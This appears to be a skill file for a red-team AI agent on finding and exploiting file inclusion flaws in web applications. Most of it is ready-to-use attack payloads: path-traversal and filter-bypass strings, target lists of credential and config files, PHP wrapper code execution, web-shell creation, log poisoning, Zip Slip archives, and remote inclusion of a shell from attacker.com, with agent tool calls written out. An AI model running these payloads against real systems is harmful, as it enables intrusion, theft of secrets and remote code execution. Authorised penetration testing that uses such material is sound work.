---
name: file-inclusion
description: Detect and exploit local and remote file inclusion vulnerabilities for sensitive data access and code execution
origin: RedteamOpencode
---

# File Inclusion Testing

## When to Activate

- Parameter references file paths: `page=`, `file=`, `template=`, `include=`, `path=`, `doc=`, `lang=`
- Dynamic content loading based on user input, URL patterns like `/index.php?page=about`
- Error messages reveal file system paths

## LFI Detection

### Basic Path Traversal
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc/passwd
?page=/etc/passwd
?page=..\..\..\..\windows\win.ini
?page=C:\windows\win.ini
```

### Filter Bypass Techniques
```
# Double encoding
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00
# Dot-dot-slash variations
?page=....//....//....//etc/passwd
?page=..;/..;/..;/etc/passwd       # Tomcat/Java
?page=..%c0%af..%c0%afetc/passwd   # Overlong UTF-8
?page=..%ef%bc%8f..%ef%bc%8fetc/passwd  # Unicode fullwidth slash
# Path truncation (PHP < 5.3, 4096+ chars)
?page=../../../etc/passwd/./././././[...repeat...]
# Extension bypass
?page=php://filter/convert.base64-encode/resource=index  # reads index.php
?page=../../../etc/passwd%00.php
```

## Sensitive Files

### Linux
```
/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/self/cmdline
/proc/self/fd/0-20, /proc/net/tcp, /home/USER/.ssh/id_rsa
/var/log/auth.log, /var/log/apache2/access.log, /var/log/nginx/access.log
```

### Web App Files
```
/etc/apache2/sites-enabled/000-default.conf, /etc/nginx/sites-enabled/default
/var/www/html/index.php, /var/www/html/config.php, /var/www/html/.env
/var/www/html/wp-config.php, .env, config.php, config.yml, database.yml, settings.py
```

### Windows
```
C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config, C:\xampp\apache\conf\httpd.conf
```

## PHP Wrappers

### php://filter — Read Source Code
```
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config
echo "BASE64_OUTPUT" | base64 -d
```

### php://input — Code Execution (requires allow_url_include=On)
```bash
run_tool curl -X POST "http://target/index.php?page=php://input" --data "<?php system('id'); ?>"
```

### data:// — Code Execution (requires allow_url_include=On)
```
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### expect:// (rare, requires expect extension)
```
?page=expect://id
```

### zip:// and phar:// — Via File Upload
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php
?page=zip://uploads/shell.zip%23shell.php
?page=phar://uploads/shell.phar/shell.php
```

## LFI to RCE

### Log Poisoning
```bash
# Inject PHP into access log via User-Agent
run_tool curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# Include the log file
?page=../../../var/log/apache2/access.log&cmd=id
# Alt: SSH log injection
ssh "<?php system(\$_GET['cmd']); ?>"@target
?page=../../../var/log/auth.log&cmd=id
```

### /proc/self/environ
```
run_tool curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ"
```

### Session File Inclusion
```
# Session files at: /var/lib/php/sessions/sess_ID or /tmp/sess_ID
# Set session var containing PHP code, then include session file
?page=../../../var/lib/php/sessions/sess_YOUR_SESSION_ID
```

### PHP Filter Chain (No File Write)
```
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# Use output as inclusion parameter value
```

## Non-PHP Stacks

### Java / JSP
```
?page=../../../WEB-INF/web.xml          # framework config disclosure (servlet mappings, security constraints)
?page=../../../WEB-INF/classes/application.properties
# JSP include via forward/dispatcher parameters instead of file params:
?view=../../../WEB-INF/applicationContext.xml
```
Java rarely exposes classic RFI (no `allow_url_include` equivalent), but `RequestDispatcher.forward()`/`include()` built from user input is functionally the same class of bug — confirm the sink is a dispatcher call, not just a `File`/`Path` read.

### Node.js / Express
```
?page=..%2f..%2f..%2fetc%2fpasswd
?page=....%2f%2f....%2f%2fetc%2fpasswd            # bypass naive single-pass `../` string replacement (strips once, leaves a working sequence)
?page=/etc/passwd%00.html                          # null-byte-style suffix confusion in older Node file-serving middleware
```
`path.join()`/`path.normalize()` collapse `../` sequences, but a bug in the app's OWN pre-check (e.g., checking `path.indexOf('..')` before, not after, a decode step) can still leave a bypass — test `..%2f` and double-URL-encoded variants against `express.static`-style routes just like the PHP double-encoding case.

### Web Server Misconfiguration (no app-level LFI parameter needed)
```
# nginx alias traversal: `location /files { alias /var/www/files/; }` (missing trailing slash on alias target)
GET /files../../../etc/passwd HTTP/1.1
```
Any reverse-proxy `alias` directive missing a matching trailing slash on the `location` block is traversable directly — this is a config bug independent of the application and should be tested even when no `page=`/`file=` parameter exists in the app itself.

### Zip Slip (archive-extraction path traversal)
```
# Craft a zip/tar entry with a traversal filename, then trigger server-side extraction (upload-and-unzip feature)
python3 -c "import zipfile; z=zipfile.ZipFile('slip.zip','w'); z.writestr('../../../../tmp/pwned.txt','pwned'); z.close()"
```
Applies to any upload feature that extracts an archive server-side (avatar theme packs, plugin installers, backup restore) without sanitizing entry paths — chain with `file-upload-testing` for the upload step.

## Remote File Inclusion (requires allow_url_include=On)

```
?page=http://attacker.com/shell.txt    # shell.txt: <?php system($_GET['cmd']); ?>
?page=http://attacker.com/shell.txt%00 # null byte to strip appended extension
?page=\\attacker.com\share\shell.php   # SMB (Windows, no allow_url_include needed)
```
